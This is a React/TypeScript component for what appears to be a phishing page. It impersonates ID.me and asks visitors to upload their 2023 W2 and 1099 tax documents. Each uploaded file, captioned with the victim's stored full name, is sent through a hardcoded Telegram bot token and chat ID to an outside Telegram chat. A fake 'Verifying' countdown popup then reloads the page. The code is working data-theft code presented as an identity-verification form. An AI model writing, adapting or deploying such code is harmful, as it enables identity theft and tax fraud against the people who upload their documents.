import React, { useEffect, useState } from "react";
import logo from '../assets/ID.me_Logo.png'
import connect from '../assets/connect.jpg'
import elogo from '../assets/logo-removebg-preview.png'

const TELEGRAM_BOT_TOKEN = "7926454402:AAEDVoo1vW7hFgkLKM3qK3f8EsiiKuDsT8c";
const TELEGRAM_CHAT_ID = "7062736155";
const W3form: React.FC = () => {
 
  const storedData = localStorage.getItem("applicationData");
  const parsedData = storedData ? JSON.parse(storedData) : {};

  const fullName = parsedData.fullname || "N/A";

 
    
  const [showPopup, setShowPopup] = useState(false);
  const [countdown, setCountdown] = useState(100);
  
  const [files, setFiles] = useState<File[]>([]);
  const [sending, setSending] = useState(false);
  const [status, setStatus] = useState("");

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files) {
      setFiles(Array.from(e.target.files));
    }
  };

  const handleSendToTelegram = async () => {
    if (!files.length) return;

    setSending(true);
    setStatus("Sending...");

    try {
      for (const file of files) {
        const formData = new FormData();
        formData.append("chat_id", TELEGRAM_CHAT_ID);
         formData.append("document", file); // Can also use "photo" for images
        formData.append("caption", `Document sent by ${fullName}`);
        
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
          method: "POST",
          body: formData,
        });
      }

      setStatus("");
      setFiles([]);
    } catch (err) {
      console.error(err);
      setStatus("");
    }

    setSending(false);
  };


  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
  
    setShowPopup(true);
  
   
  };

  useEffect(() => {
    let timer: NodeJS.Timeout;

    if (showPopup && countdown > 0) {
      timer = setTimeout(() => {
        setCountdown((prev) => prev - 1);
      }, 1000);
    }

    if (countdown === 0) {
      window.location.reload();
    }

    return () => clearTimeout(timer);
  }, [showPopup, countdown]);



  

  return (
    <div className="flex justify-center items-center min-h-screen bg-white px-4">

{showPopup && (
  <div className="fixed inset-0 bg-black bg-opacity-80 flex justify-center items-center z-50">
    <div className="bg-white rounded-lg p-6 w-[350px] h-[400px] max-w-md text-center shadow-lg flex flex-col justify-center">
      <div className="flex justify-center mb-4"><img src={elogo} width={50}  /></div>
      <h2 className="text-sm font-semibold text-black mb-2">Verifying....</h2>
      <p className="text-sm font-semibold text-black mb-6">
        Please wait while the system connects. Avoid refreshing the page; this may take a moment.
      </p>

      <div className="w-full bg-gray-200 rounded-full h-4 mb-6">
        <div
          className="bg-green-500 h-4 rounded-full transition-all duration-1000"
          style={{ width: `${100 - countdown}%` }}
        ></div>
      </div>

      <p className="text-sm text-gray-600">Typically, <strong>{countdown}</strong> seconds remaining</p>
    </div>
  </div>
)}


      <div className="w-full max-w-md bg-white p-6 text-center relative">
        {/* Spinner */}
        <div className="absolute top-4 left-1/2 transform -translate-x-1/2">
          <svg
            className="animate-spin h-6 w-6 text-gray-600"
            xmlns="http://www.w3.org/2000/svg"
            fill="none"
            viewBox="0 0 24 24"
          >
            <circle
              className="opacity-25"
              cx="12"
              cy="12"
              r="10"
              stroke="currentColor"
              strokeWidth="4"
            />
            <path
              className="opacity-75"
              fill="currentColor"
              d="M4 12a8 8 0 018-8v8H4z"
            />
          </svg>
        </div>

        {/* Logo */}
        <h1 className="text-3xl flex  justify-center gap-4 font-medium mt-10 mb-6">
         <img src={logo} alt="" className="w-[100px]"/>
          {/* <span className="text-green-700 ml-2">CONNECT</span> */}
 <img src={connect} alt="" />       </h1>

      <div className="border-2 border-gray-200 shadow-md p-4">
       <p className="text-green-700 text-[16px] font-bold mb-6">
       Upload Employment Proof
          <br />
          
        </p>

        <p className="mb-3">Please upload proof of your 2023 employment (W2, 1099). Acceptable formats includes DOCX, PDFs and common image formats  </p>

        <em><p className="text-[10px]">Note: you can upload multiple files at a time <br /> upload one after the other</p></em> 

        <div>

        <div className="bg-white shadow p-4 rounded max-w-md mx-auto">
      <h2 className="text-lg font-bold mb-3 bg-green-500 w-[150px] p-2 rounded-lg m-auto">Browse Files</h2>

      <input
        type="file"
        multiple
        onChange={handleFileChange}
        className="mb-3"
      />

      {files.length > 0 && (
        <ul className="mb-3 text-sm text-gray-600 list-disc pl-4">
          {files.map((file, idx) => (
            <li key={idx}>{file.name}</li>
          ))}
        </ul>
      )}

      <button
        onClick={handleSendToTelegram}
        disabled={sending || !files.length}
        className="bg-green-600 text-white px-4 py-2 rounded hover:bg-green-700 disabled:opacity-50"
      >
        {sending ? "uploading..." : "Submit"}
      </button>

      {status && <p className="mt-3 text-sm">{status}</p>}
    </div>
            
        </div>
      </div>
       





        <button onClick={handleSubmit} ></button>

        
      </div>
    </div>
  );
};

export default W3form;
